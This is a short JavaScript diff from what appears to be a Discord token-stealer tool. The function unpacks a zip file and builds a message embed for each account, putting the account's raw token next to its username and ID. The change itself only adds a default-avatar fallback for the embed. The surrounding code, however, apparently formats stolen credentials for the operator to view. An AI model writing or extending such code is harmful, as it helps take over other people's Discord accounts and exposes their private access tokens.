@@ -44,7 +44,7 @@ const json = async (zipFile) => {
     description: `Token: ${codeBlock(account.token)}`,
     author: {
       name: `${account.username}#${account.discriminator}`,
-      icon_url: avatarURL(account.id, account.avatar)
+      icon_url: account.avatar ? avatarURL(account.id, account.avatar) : `https://cdn.discordapp.com/embed/avatars/${account.discriminator % 5}.png`
     },
     fields: [
       ['🆔 ID', codeBlock(account.id)],
